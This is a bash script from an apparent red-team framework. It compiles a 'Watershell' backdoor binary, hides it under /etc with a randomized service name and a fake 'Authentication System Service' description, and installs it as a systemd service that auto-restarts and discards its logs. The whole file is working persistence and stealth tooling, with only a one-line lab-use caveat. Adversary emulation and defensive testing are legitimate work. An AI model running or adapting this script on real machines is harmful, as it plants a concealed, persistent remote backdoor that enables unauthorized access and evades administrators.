#!/usr/bin/env bash
#
# payloads/persistence_tasks/systemd_watershell/commands.sh
#
# Compiles the shared Watershell source, stages it beneath /etc/<service>/, and
# persists it with a randomized systemd service.
#
# Intended only for local lab/VM environments under your control.

set -euo pipefail

if [[ -z "${FRAMEWORK_ROOT:-}" ]]; then
    echo "[x] FRAMEWORK_ROOT must be set" >&2
    exit 1
fi

source "$FRAMEWORK_ROOT/lib/log_utils.sh"
source "$FRAMEWORK_ROOT/lib/random_utils.sh"
source "$FRAMEWORK_ROOT/lib/template_utils.sh"
source "$FRAMEWORK_ROOT/lib/metadata_utils.sh"
source "$FRAMEWORK_ROOT/lib/privilege_utils.sh"

shell_quote() {
    printf "%q" "$1"
}

run_priv_checked() {
    local cmd="$1"
    log "run_priv: $cmd"
    run_priv "$cmd"
}

require_privilege

TMP_BUILD_DIR="$(mktemp -d)"

cleanup_tmp() {
    rm -rf "$TMP_BUILD_DIR"
}
trap cleanup_tmp EXIT

WATERSHELL_SOURCE="${WATERSHELL_SOURCE:-}"
WATERSHELL_HEADER="${WATERSHELL_HEADER:-}"

if [[ -n "${WATERSHELL_SOURCE_B64:-}" || -n "${WATERSHELL_HEADER_B64:-}" ]]; then
    command -v base64 >/dev/null 2>&1 || fail "base64 is required to unpack embedded Watershell assets"
fi

if [[ -z "$WATERSHELL_SOURCE" ]]; then
    if [[ -n "${WATERSHELL_SOURCE_B64:-}" ]]; then
        WATERSHELL_SOURCE="${TMP_BUILD_DIR}/watershell.c"
        printf '%s' "$WATERSHELL_SOURCE_B64" | base64 -d > "$WATERSHELL_SOURCE"
    else
        WATERSHELL_SOURCE="${FRAMEWORK_ROOT:-}/payloads/shared/watershell.c"
    fi
fi

if [[ -z "$WATERSHELL_HEADER" ]]; then
    if [[ -n "${WATERSHELL_HEADER_B64:-}" ]]; then
        WATERSHELL_HEADER="${TMP_BUILD_DIR}/watershell.h"
        printf '%s' "$WATERSHELL_HEADER_B64" | base64 -d > "$WATERSHELL_HEADER"
    else
        WATERSHELL_HEADER="${FRAMEWORK_ROOT:-}/payloads/shared/watershell.h"
    fi
fi

[[ -f "$WATERSHELL_SOURCE" ]] || fail "Missing Watershell source: $WATERSHELL_SOURCE"
[[ -f "$WATERSHELL_HEADER" ]] || fail "Missing Watershell header: $WATERSHELL_HEADER"
command -v gcc >/dev/null 2>&1 || fail "gcc is required to build Watershell"

SERVICE_NAME="$(pick_service_name)"

APPEND_RANDOM_SUFFIX="${APPEND_RANDOM_SUFFIX:-true}"
RANDOM_SUFFIX_LENGTH="${RANDOM_SUFFIX_LENGTH:-6}"

if [[ "$APPEND_RANDOM_SUFFIX" == "true" ]]; then
    SERVICE_NAME="${SERVICE_NAME}-$(random_lower_string "$RANDOM_SUFFIX_LENGTH")"
fi

SERVICE_NAME="$(sanitize_identifier "$SERVICE_NAME")"

SERVICE_DIR_BASE="${SERVICE_DIR_BASE:-/etc}"
SERVICE_DIR="${SERVICE_DIR:-${SERVICE_DIR_BASE}/${SERVICE_NAME}}"
SERVICE_BINARY_NAME="${SERVICE_BINARY_NAME:-${SERVICE_NAME}_sys}"
SERVICE_BINARY_PATH="${SERVICE_DIR}/${SERVICE_BINARY_NAME}"
SYSTEMD_UNIT_DIR="${SYSTEMD_UNIT_DIR:-/etc/systemd/system}"
SYSTEMD_UNIT_PATH="${SYSTEMD_UNIT_DIR}/${SERVICE_BINARY_NAME}.service"
SERVICE_DESCRIPTION="${SERVICE_DESCRIPTION:-${SERVICE_NAME^} Authentication System Service}"
WATERSHELL_INTERFACE="${WATERSHELL_INTERFACE:-eth0}"
WATERSHELL_PORT_OFFSET="${WATERSHELL_PORT_OFFSET:-0}"
WATERSHELL_PROMISC="${WATERSHELL_PROMISC:-false}"
SERVICE_LOG_FILE="${SERVICE_LOG_FILE:-/dev/null}"
ENABLE_SERVICE="${ENABLE_SERVICE:-true}"
START_SERVICE="${START_SERVICE:-true}"

TMP_BINARY="${TMP_BUILD_DIR}/${SERVICE_BINARY_NAME}"
TMP_UNIT="${TMP_BUILD_DIR}/${SERVICE_BINARY_NAME}.service"

log "systemd_watershell starting"
log "Service name: $SERVICE_NAME"
log "Service directory: $SERVICE_DIR"
log "Service binary path: $SERVICE_BINARY_PATH"
log "Systemd unit path: $SYSTEMD_UNIT_PATH"

log "Compiling Watershell"
gcc -O2 -Wall -o "$TMP_BINARY" "$WATERSHELL_SOURCE"
chmod 755 "$TMP_BINARY"

WATERSHELL_ARGS="-i $WATERSHELL_INTERFACE -l $WATERSHELL_PORT_OFFSET"

if [[ "$WATERSHELL_PROMISC" == "true" ]]; then
    WATERSHELL_ARGS="-p $WATERSHELL_ARGS"
fi

cat > "$TMP_UNIT" <<EOF
[Unit]
Description=$SERVICE_DESCRIPTION
After=network-online.target
Wants=network-online.target

[Service]
Type=forking
ExecStart=$SERVICE_BINARY_PATH $WATERSHELL_ARGS
Restart=always
RestartSec=10
StandardOutput=append:$SERVICE_LOG_FILE
StandardError=append:$SERVICE_LOG_FILE

[Install]
WantedBy=multi-user.target
EOF

q_service_dir="$(shell_quote "$SERVICE_DIR")"
q_service_binary_path="$(shell_quote "$SERVICE_BINARY_PATH")"
q_systemd_unit_path="$(shell_quote "$SYSTEMD_UNIT_PATH")"
q_tmp_binary="$(shell_quote "$TMP_BINARY")"
q_tmp_unit="$(shell_quote "$TMP_UNIT")"
q_service_unit_name="$(shell_quote "$(basename "$SYSTEMD_UNIT_PATH")")"

run_priv_checked "mkdir -p $q_service_dir"
run_priv_checked "cp $q_tmp_binary $q_service_binary_path"
run_priv_checked "chmod 755 $q_service_binary_path"
run_priv_checked "cp $q_tmp_unit $q_systemd_unit_path"
run_priv_checked "chmod 644 $q_systemd_unit_path"
run_priv_checked "systemctl daemon-reload"

if [[ "$ENABLE_SERVICE" == "true" ]]; then
    run_priv_checked "systemctl enable $q_service_unit_name"
fi

if [[ "$START_SERVICE" == "true" ]]; then
    run_priv_checked "systemctl start $q_service_unit_name"
fi

record_metadata "service_name=$SERVICE_NAME"
record_metadata "service_binary_name=$SERVICE_BINARY_NAME"
record_metadata "service_dir=$SERVICE_DIR"
record_metadata "service_binary_path=$SERVICE_BINARY_PATH"
record_metadata "systemd_unit_path=$SYSTEMD_UNIT_PATH"
record_metadata "systemd_unit_name=$(basename "$SYSTEMD_UNIT_PATH")"
record_metadata "watershell_interface=$WATERSHELL_INTERFACE"
record_metadata "watershell_port_offset=$WATERSHELL_PORT_OFFSET"
record_metadata "watershell_promisc=$WATERSHELL_PROMISC"
record_metadata "service_enabled=$ENABLE_SERVICE"
record_metadata "service_started=$START_SERVICE"

log "systemd_watershell persistence installed"
